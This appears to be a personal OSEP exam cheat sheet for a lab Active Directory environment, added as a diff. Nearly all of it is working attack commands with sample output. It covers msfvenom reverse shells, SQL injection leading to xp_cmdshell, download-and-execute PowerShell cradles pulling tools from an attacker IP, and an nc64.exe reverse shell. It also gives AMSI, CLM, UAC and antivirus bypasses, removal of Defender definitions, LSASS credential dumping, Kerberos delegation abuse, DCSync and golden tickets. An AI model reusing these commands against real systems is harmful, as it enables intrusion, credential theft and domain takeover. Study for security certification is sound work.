@@ -1,0 +1,566 @@
+Checklist: https://forsec.nl/osep.html#amsi
+
+1. Initial foothold: - met.exe, met.aspx
+
+	- scan nmap "sudo nmap -A -Pn 192.168.120.130-132"
+	- Find Domain and computer name: 
+		DNS_Domain_Name: evil.com
+		DNS_Computer_Name: dc02.evil.com
+	- Check for ports and services running
+
+	1.1 File upload (met.exe, met.aspx)
+		1. Use met.exe to create reverse shell
+		msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f aspx -o /home/kali/met.aspx
+		2. AV bypass using met.aspx
+
+		meterpreter> getuid
+		meterpreter> systeminfo
+
+	1.2 HTML Smuggling
+		https://github.com/vivekj2/osep/blob/main/3.1%20html%20smuggling
+
+	1.3 File/Document upload: (Normal)
+		(Use VBA shellcode runner code)
+		https://github.com/vivekj2/osep/blob/main/Exam%201%20(AV%20Bypass)
+		Migrate shell to explorer.exe
+
+		(Use Powershell shellcode runner)
+		https://github.com/vivekj2/osep/blob/main/3.5%20Win32%20API-%20PowerShell%20Shellcode%20Runner
+
+		(Use Jscript Dropper)
+		https://github.com/vivekj2/osep/blob/main/4.1%20Jscript%20dropper
+
+		(Use C# Shellcode runner)
+		https://github.com/vivekj2/osep/blob/main/4.2%20Shellcode%20Runner%20in%20C%23
+
+		(Explorer.exe Reverse Shell Payload)
+		https://github.com/vivekj2/osep/blob/main/5.1%20Process%20injection
+
+		(Host DLL on web server and exploit using C# app)
+		https://github.com/vivekj2/osep/blob/main/5.2%20DLL%20Injection
+
+		(DLL Injection without EXE)
+		https://github.com/vivekj2/osep/blob/main/5.3%20Reflective%20DLL%20Injection
+
+		(SCVHOST Injection and reverse shell)
+		https://github.com/vivekj2/osep/blob/main/5.4%20Process%20hollow
+
+	1.4 File/Document Uplaod: (AV Bypass)
+		(Metasploit Encoder)
+		https://github.com/vivekj2/osep/blob/main/6.4%20Bypassing%20Antivirus%20with%20Metasploit
+
+		(AES Ecrypt C# Payload)
+		https://github.com/vivekj2/osep/blob/main/6.5.1%20Encrypting%20the%20C%23%20Shellcode%20Runner
+
+		(Ceaser cipher and sleep)
+		https://github.com/vivekj2/osep/blob/main/6.6%20Sleep%20timers
+
+		(VBA AV Bypass)
+		https://github.com/vivekj2/OSEP-ch/tree/main/6.Introduction_to_Antivirus_Evasion/6.7.1_Bypassing_Antivirus_in_VBA
+		
+	1.3 SQL Injection: (xp_cmdshell)
+		' or 1=1; -- -
+		' union select @@version,2; --
+		' union select DB_NAME(),2; --
+		' union select current_user,2; --
+		' union select name,2 from users--
+		' union select name,2 from master..sysdatabases; --
+		' union select pass,2 from users--
+		
+		Server:
+		'; EXEC sp_configure 'show advanced options',1;--
+		'; RECONFIGURE;--
+		'; EXEC sp_configure 'xp_cmdshell',1;--
+		'; RECONFIGURE;--
+
+		Client:
+		tcpdump -i tun0 icmp
+		'; EXEC master.dbo.xp_cmdshell 'ping -n 2 192.168.X.Y';--
+
+		Shell:
+		msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.Y LPORT=443 -f aspx -o 3.aspx
+		Create C# code with ceaser cipher
+		https://github.com/vivekj2/osep/blob/main/6.5.1%20Encrypting%20the%20C%23%20Shellcode%20Runner
+		Modify Aspx file content and host over kali
+		'; EXEC master.dbo.xp_cmdshell "powershell.exe iwr -uri http://192.168.X.Y/3.aspx -o  C:\inetpub\wwwroot\3.aspx";--
+		meterpreter > getuid 
+ 
+	1.4 Linux ELF File Upload:
+		# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.X.Y LPORT=443 -f c
+		https://github.com/vivekj2/osep/edit/main/Exam1%20(Linux)
+
+	
+2. Recon: (Host) - HostRecon.ps1, Powerview
+
+	# Migrate shell to explorer.exe or notepad
+		meterpreter > execute -H -f explorer
+		meterpreter> ps
+		meterpreter> migrate 620
+
+	2.1 LAPs Toolkit to get clertext password
+		iex (new-object net.webClient).DownloadString("http://192.168.49.71/LAPSToolkit.ps1")
+		Get-LAPSComputers
+
+	2.1 Powershell Exec Bypass (powershell -exec bypass)
+		Donwload hostrecon.ps1 script
+		PS:> (new-object system.net.webclient).downloadstring('http://192.168.45.163/HostRecon.ps1') | IEX
+		PS:> Invoke-HostRecon
+			Check LAPS 
+			Check Defender
+		PS:> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
+			Check LSA Protection (if 1)
+
+		PS:> Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
+			Check AppLocker (File Publish RUle: Microsoft)
+
+		
+	2.3 Check Delegation in Kerberos
+		iex (new-object system.net.webclient).downloadstring('http://192.168.119.120/powerview.ps1')
+		PS> Get-DomainComputer -TrustedToAuth
+			distinguishedname             : CN=WEB01,OU=EvilServers,OU=EvilComputers,DC=evil,DC=com
+			msds-allowedtodelegateto      : {cifs/file01.evil.com, cifs/FILE01}
+			TRUSTED_TO_AUTH_FOR_DELEGATION
+		(web01) is configured for constrained delegation to the CIFS service on file01.
+
+	
+	2.3 Check AMSI Bypass (https://forsec.nl/osep.html#amsi)
+		(Check AMSI Bypass)
+		One liner AMSI bypass script
+		https://github.com/vivekj2/osep/blob/main/7.3%20AMSI%20bypass%202
+		(new-object system.net.webclient).downloadstring('http://192.168.1.1/amsi.txt') | IEX 
+		Download AMSI code Remotely
+	
+		Run.txt and UAC Bypass
+		https://github.com/vivekj2/osep/blob/main/7.5%20FodHelper%20UAC%20Bypass2
+		
+
+	2.5 Check CLM Bypass: (Check language mode)
+		# $ExecutionContext.SessionState.LanguageMode 
+        	ConstrainedLanguage
+
+		To bypass CLM, we can use https://github.com/calebstewart/bypass-clm
+		 PS C:\windows\tasks> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
+		
+		PS C:\windows\tasks> $ExecutionContext.SessionState.LanguageMode $ExecutionContext.SessionState.LanguageMode
+        	FullLanguage
+	
+	2.6 User creation in AD:
+		CMD> net user vivek Password#123 /add /domain
+		CMD> net localgroup "Remote Desktop Users" rulon /add /domain 
+		CMD> net group "domain admins" rulon /add /domain
+
+	2.7 SQL Express: (create a new user and add to sysadmin)
+		python3 mssqlclient.py webapp11@192.168.X.140
+		EXEC ('EXEC sp_addlogin ''rulon'', ''password123!''') at [SQL27];
+		EXEC ('EXEC sp_addsrvrolemember ''rulon'', ''sysadmin''') at [SQL27];
+
+		python3 mssqlclient.py rulon@192.168.X.141
+		SQL> enable_xp_cmdshell
+		SQL> xp_cmdshell whoami
+		SQL> xp_cmdshell "more c:\users\administrator\desktop\proof.txt"
+
+		SQL> xp_cmdshell "powershell.exe iwr -uri http://192.168.X.Y:8081/nc64.exe -o  c:\windows\tasks\nc64.exe"
+		SQL> xp_cmdshell "c:\windows\tasks\nc64.exe 192.168.X.Y 444 -e cmd.exe"
+
+	2.8 Check if SAM can be copied:
+		https://github.com/vivekj2/osep/blob/main/12.1%20Windows%20credentials
+
+	2.9 Load Incognito and check user tokens
+		https://github.com/vivekj2/osep/blob/main/12.3%20Incognito
+
+	2.10 LSASS Dump 
+		(Using C# application)
+		https://github.com/vivekj2/osep-final/blob/main/module_12/lsass_dump.cs
+
+		(Using powershell)
+		https://github.com/vivekj2/osep-final/blob/main/module_12/lsass_dump.ps1
+		
+
+3. Priviledge Escalation: (AD)
+
+	2.2 Priv Escalation: (Need NTLM Hash of web01 (obtain higher privileges locally on the web server.))
+		
+		ps> whoami /priv  -> SeImpersonatePrivilege : Enabled
+		Windows Server 2019:  PrintSpoofer  exploit
+		
+		# Use https://github.com/itm4n/PrintSpoofer to escalate priviledges from NT\Services to NT\Authority
+		PrintSpoofer.exe -i -c cmd
+		
+		C:\TOOLS>printspoofer.exe -d 3 -c "powershell -ep bypass"
+
+	2.3 PowerView Clear Password:
+		PS> IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/PowerView.ps1'
+		PS> Get-ADObject -Name web05 -DomainController 192.168.X.120 -Properties ms-mcs-admpwd
+		PS> Password
+
+	3.5 GENERIC ALL PERMISSION:
+		.\powerview.ps1
+		PS> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+			AceType               : AccessAllowed	
+			ObjectDN              : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com
+			ActiveDirectoryRights : GenericAll
+			Identity              : PROD\offsec
+
+		(Change user password)
+		PS> net user testservice1 h4x /domain
+
+		(Enumerate all domain groups that our current user has explicit access rights)
+		PS> Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+			AceType               : AccessAllowed
+			ObjectDN              : CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com
+			ActiveDirectoryRights : GenericAll
+			Identity              : PROD\offsec
+
+		(we have GenericAll access rights on the TestGroup group, adding ourselves to it.)
+		PS> net group testgroup offsec /add /domain
+
+	3.6 WriteDACL:
+		(Find Misconfiguration)
+		PS> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+		 	AceType               : AccessAllowed
+			ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
+			ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl
+			Identity              : PROD\offsec
+
+		(use the Add-DomainObjectAcl PowerView method to apply additional access rights such as GenericAll, GenericWrite, or even DCSync)
+		PS> Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+
+		(Check if its implemented)		
+		Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+			ActiveDirectoryRights : GenericAll
+
+		(Let's change its password)
+		PS> net user testservice2 h4x /domain
+	
+
+	3.7 PrintSpoof 
+		(Priv Esc)
+		https://github.com/vivekj2/osep-final/blob/main/module_12/printspoofer_custom_command.cs
+		
+		(Rev Shell)
+		https://github.com/vivekj2/osep-final/blob/main/module_12/printspoofer_proc_hollow.cs
+
+		(CMD SHell)
+		https://github.com/vivekj2/osep-final/blob/main/module_12/printspoofer_with_shell.cs
+		
+4. Local User to Domain User
+	# Get-NetComputer -Unconstrained	
+
+	
+	4.2 Priv Escalation: (Powershell)
+		.\PsExec64.exe -accepteula -s -i cmd.exe
+		.\SharpHound.exe --CollectionMethod All --GPOLocalGrou
+		C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all 		
+
+	4.2 Constrained delegation: (dump the NTLM hash)
+		
+		4.2.1 Dump using mimikatz
+			C:\Tools\Mimikatz> mimikatz.exe
+			mimikatz # privilege::debug
+			mimikatz # sekurlsa::logonpasswords
+ 				* Username : offsec
+         			* Domain   : corp1
+         			* NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+		4.2.2 Task Manager -> locate the lsass.exe -> Create dump
+			mimikatz.exe
+  			mimikatz # sekurlsa::minidump lsass.dmp
+  			mimikatz #sekurlsa::logonpasswords
+
+		4.3.3 C# code to execute a memory dump with mimikatz
+		https://github.com/vivekj2/osep/blob/4d8bf7e2f00a4d6a3881354d422cfccbf2ef29df/Exam%201%20(AD)#L87
+			mimikatz.exe
+			sekurlsa::minidump lsass.dmp
+			sekurlsa::logonpasswords
+	
+		Move file to server meterpreter> download c:\windows\tasks\lsass.dump /var/www/html/lsass.dump
+
+	4.3 Ticket Delegation: Rubeus (change the .NET version to target 4.6)
+
+		To Evade AV, copy Rubus to Kali webroot and then call it in memmory
+		ps> (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | IEX
+		ps> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe')
+		ps> $assem = [System.Reflection.Assembly]::Load($data)
+
+		ps> [Rubeus.Program]::Main("purge".Split()) //purge tickets
+		
+		//invoke Rubeus to request the TGS for the CIFS service on file01 as administrator
+		[Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
+		
+		//when successful verify this with the klist
+		ps> klist
+			Client: administrator @ EVIL.COM
+        		Server: cifs/file01 @ EVIL.COM
+		ps> ls \\file01\c$ 
+
+	4.4 Spoolss 
+		> ls \\dc03.infinity.com\pipe\spools 
+		spoolss runs on the server
+		
+		.\Rubeus.exe monitor /interval:1
+		.\SpoolSample.exe dc03.infinity.com web05.infinity.com (Then we grab the ticket for DC03$)		
+		.\Rubues.exe ptt /ticket:base64
+
+		.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:infinity.com /user:krbtgt /csv" "exit (do a dcsync with mimikatz)
+		 Hash NTLM: 120f9d6c433ec5b065fee44cf0f89354
+		
+		\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:infinity.com /user:administrator /csv" "exit" (Grab admin hash)
+		5f9163ca3b673adfff2828f368ca3760
+
+		#evil-winrm -u infinity.com\\administrator -H 5f9163ca3b673adfff2828f368ca3760 -i 192.168.X.120 (DC with domain administrator hash)
+
+	
+5. Laternal Moveement:
+
+	 C# application that performs process injection into spoolsv
+	https://github.com/vivekj2/osep/blob/4d8bf7e2f00a4d6a3881354d422cfccbf2ef29df/README.md?plain=1#L849
+	
+	PS> copy C:\inetpub\wwwroot\upload\inject.exe \\file01\c$
+	PS> ls \\file01\c$
+	PS> MpCmdRun.exe -RemoveDefinitions -All (Delete all defender updates)
+	PS> Lat.exe 
+			
+	5.1 Pass the ticket: ( c$ share on file01 to copy our custom executable from web01.)
+		
+
+5. Domain Admin:
+	
+	meterpreter >   ps (paul usrer is runing explorer.exe)
+			net user paul /domain (Part of domain admin)
+
+	 Dump the NTLM hash of paul from LSASS, but that means disabling LSA protection again.
+
+	meterpreter > load incognito
+	meterpreter > list_tokens -u
+	meterpreter > upload /home/kali/lat2.exe c:\\lat2.exe
+	meterpreter > background
+	msf5 exploit(multi/handler) > exploit -j
+	meterpreter > impersonate_token EVIL\\paul
+
+	meterpreter > shell
+	C:\Windows\system32> copy c:\inject.exe \\dc02\c$
+	C:\Windows\system32> c:\lat2.exe
+
+	3.10 KERBEROS constrained Delegation: (Resource)
+		PS C:\tools> Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+			ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
+			ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+			Identity              : PROD\dave
+
+		(Dave user has GenericWrite to appsrv01, We use powermad.ps1)
+		.\powermad.ps1
+		PS> New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
+			[+] Machine account myComputer added
+		PS> Get-DomainComputer -Identity myComputer
+		PS> $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+		PS> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+		PS> $SDbytes = New-Object byte[] ($SD.BinaryLength)
+		PS> $SD.GetBinaryForm($SDbytes,0)
+		Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+		(After writing the SecurityDescriptor to the property field, we should verify it)
+		PS> $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+		PS> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0	
+		PS> $Descriptor.DiscretionaryAcl
+			SecurityIdentifier : S-1-5-21-3776646582-2086779273-4091361643-2101
+		PS> ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
+			PROD\myComputer$
+	
+		(Now obtain the hash of the computer account password with Rubeus)	
+		PS> .\Rubeus.exe hash /password:h4x
+			rc4_hmac             : AA6EAFB522589934A6E5CE92C6438221
+		
+		(submit the username and password hash to the s4u command, which will implicitly call asktgt and inject the resultant TGT)
+		PS> .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
+			[+] TGT request successful!
+			[*] Building S4U2self request for: 'myComputer$@PROD.CORP1.COM'
+			[*] Sending S4U2self request
+			[+] S4U2self success!
+			[*] Got a TGS for 'administrator@PROD.CORP1.COM' to 'myComputer$@PROD.CORP1.COM'
+			[*] Impersonating user 'administrator' to target SPN 'CIFS/appsrv01.prod.corp1.com'
+			[*] Building S4U2proxy request for service: 'CIFS/appsrv01.prod.corp1.com'
+			[*] Sending S4U2proxy request
+			[+] S4U2proxy success!
+
+		(To check the success of this attack, we'll first dump any loaded Kerberos tickets with klist)
+		PS> klist
+			Cached Tickets: (1)
+			#0>     Client: administrator @ PROD.CORP1.COM
+        		Server: CIFS/appsrv01.prod.corp1.com @ PROD.CORP1.COM
+
+		(Now that we have a TGS for the CIFS service on appsrv01 as administrator, we can interact with file)
+		PS> dir \\appsrv01.prod.corp1.com\c$
+
+	3.8 KERBEROS  Unconstrained Delegation: (No Access -Printer bug)
+		(Determine if the print spooler service is running and available on the domain controller)
+		PS> dir \\cdc01\pipe\spoolss   -> spoolss
+		
+		(Use SpoolSample to facilitate the attack, launch Rubeus from an administrative command prompt in monitor mode)
+		PS> Rubeus.exe monitor /interval:5 /filteruser:CDC01$
+		
+		(Open a second command prompt and trigger the print spooler change notification)
+		PS> SpoolSample.exe CDC01 APPSRV01
+			
+		(Rubeus displays the TGT for the domain controller account)
+		User                  :  CDC01$@PROD.CORP1.COM
+		Base64EncodedTicket   : doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEF...
+
+		(Inject the ticket into memory)
+		PS> Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+			[+] Ticket successfully imported!
+		
+		(TGT of the domain controller machine account injected into memory, but its not local admin account)
+		(dcsync and dump the password hash of any user, including the special krbtgt account.)
+		mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+			DC] 'prod.corp1.com' will be the domain
+			[DC] 'CDC01.prod.corp1.com' will be the DC server
+			[DC] 'prod\krbtgt' will be the user account
+			SAM Username         : krbtgt
+			 ntlm- 0: 4b6af2bf64714682eeef64f516a08949
+
+	
+	3.9 KERBEROS constrained Delegation:
+		(Constrained delegation limits the delegation scope, lets enumerate constrained delegation)
+		.\powerview.ps1
+		PS> Get-DomainUser -TrustedToAuth
+			samaccountname           : IISSvc
+			msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS, MSSQLSvc/cdc01.prod.corp1.com:1433}
+			useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+
+		(Constrained delegation set for IISSvc, and only allowed to that SQL server.)
+		(If we compromise the IISSvc account, we can request a service ticket to IIS for any user in the domain, including a domain administrator)
+		(Use the hash command in Rubeus to generate the NTLM hash)
+		PS> .\Rubeus.exe hash /password:lab
+			rc4_hmac             : 2892D26CDF84D7A70E2EB3B9F05C425E
+		
+		(We'll use Rubeus to generate a TGT for IISSvc with the asktgt command)
+		.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
+			base64(ticket.kirbi):doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6A.
+
+		(s4u command and then providing the Base64-encoded TGT (/ticket) and the username we want to impersonate (/impersonateuser))
+		.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+			[*] Got a TGS for 'administrator@PROD.CORP1.COM' to 'iissvc@PROD.CORP1.COM'
+			[*] Building S4U2proxy request for service: 'mssqlsvc/cdc01.prod.corp1.com:1433'
+			[*] Sending S4U2proxy request
+			[+] S4U2proxy success!
+			base64(ticket.kirbi) 'mssqlsvc/cdc01.prod.corp1.com:1433': doIGfDCCBnigAwIBBaEDAgEWooIFajCCBWZhggViMIIF...
+
+		(TGS for MSSQL on CDC01 was injected into memory)
+		PS C:\Tools> .\SQL.exe
+			Auth success!
+			Logged in as: PROD\Administrator
+
+		(We can modify the service name within the TGS in memory and obtain access to a different service on the same host)
+		.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
+			[*] base64(ticket.kirbi) for SPN 'CIFS/cdc01.prod.corp1.com:1433':
+
+	3.7 KERBEROS  Unconstrained Delegation: (Admin Access)
+		(service receives a forwardable TGT, it can perform authentication on behalf of the user to any service (because of unconstrained delegation), not just the intended backend service)
+		.\powerview.ps1
+		PS> Get-DomainComputer -Unconstrained
+			useraccountcontrol                       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+			name                                     : APPSRV01
+		
+		(appsrv01 machine is configured with unconstrained delegation and will be our target)
+		PS> nslookup appsrv01
+			Name:    appsrv01.prod.corp1.com
+			Address:  192.168.120.75
+		
+		(We have admin rights, No domain user tickets are listed)
+		mimikatz # privilege::debug
+		mimikatz # sekurlsa::tickets
+		
+		(In nmap scan, IIS was running on the server, so we can hit the URL from browser)
+		mimikatz # sekurlsa::tickets
+			User Name         : admin
+			Group 2 - Ticket Granting Ticket
+			Client Name  (01) : admin ; @ PROD.CORP1.COM
+			
+		(Got TGT,lets export and dummp into disk)
+		sekurlsa::tickets /export
+			Saved to file [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi 
+		kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
+			* File: '[0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi': OK
+		
+		(TGT for the admin user injected into memory, try access to server)
+		C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
+		C:\Windows\system32> whoami -> prod\admin
+
+	3.11.1 Domain Forest: (Extra SID)
+			PS> nltest /trusted_domains
+				0: CORP1 corp1.com (NT 5) (Forest Tree Root) 
+				1: PROD prod.corp1.com (NT 5) (Forest: 0) (Primary Domain)
+			
+			(Another way)
+			ps> ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+				prod.corp1.com corp1.com  ParentChild  Bidirectional
+
+			(Enumeration of users in the trusted corp1.com domain)
+			PS> .\Powerview
+			PS> Get-DomainUser -Domain corp1.com
+				name                   : Administrator
+				memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=corp1,DC=com, CN=Domain
+				
+			(In domain forest goal is to escalate Domain admin to Enterprise Admin, compromise the root domain and obtain Enterprise Admin group membership)
+			(We can obtain the NTLM hash of the trust account from the domain controller)
+			mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:corp1$
+				lsadump::dcsync /domain:prod.corp1.com /user:corp1$
+				Hash NTLM: cf4bc17dff896101da4f3498a68d50f2
+			ps> dir \\rdc01.corp1.com\c$
+			ps> klist
+
+			(open a command prompt as the admin user, which is a member of the Domain Admins group in prod.corp1.com. This will simulate our compromise of the domain and allow us to obtain the krbtgt password hash.)
+			lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+				lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+
+			(we can create a golden ticket.)
+			ps> Get-DomainSID -Domain prod.corp1.com
+					S-1-5-21-3776646582-2086779273-4091361643
+			ps> Get-DomainSid -Domain corp1.com
+					S-1-5-21-1095350385-1831131555-2412080359
+
+			(we need is the RID of the Enterprise Admins group, which is static 519, lets inject the ticket into memory)
+			mimikatz # kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
+					Extra SIDs: S-1-5-21-1095350385-1831131555-2412080359-519;
+
+			(After the ticket is generated and injected)
+			c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
+			c:\ whoami /groups
+				CORP1\Enterprise Admins
+
+	3.11.2 Domain Forest: (Printer)
+			(Check Spoolss)
+			ps> ls \\rdc01\pipe\spoolss
+
+			(Rubeus to monitor for new tickets from the root domain controller machine account)
+			PS> Rubeus.exe monitor /interval:5 /filteruser:RDC01$
+			
+			(launch SpoolSample to force the print change notification from rdc01)
+			PS> .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com		
+	
+			(We get forwardable TGT, use Rubeus to inject it into memory)
+			Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
+				[*] Action: Import Ticket
+				[+] Ticket successfully imported!
+
+			mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\administrator
+				SAM Username         : Administrator
+				Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+
+6. Linux:
+
+	6.1 Sudo Priv Escalation
+		https://github.com/vivekj2/osep/blob/main/10.1%20VIM%20backdoor
+
+	6.2 C Program Shell
+		https://github.com/vivekj2/osep/blob/main/10.2%20Bypass%20AV
+
+	6.3 AV Bypass C Program(XOR)
+		https://github.com/vivekj2/osep/blob/main/10.2.1%20Bypass%20Antiscan 	
+		 
+ 
+	
+		
+		
+		
+
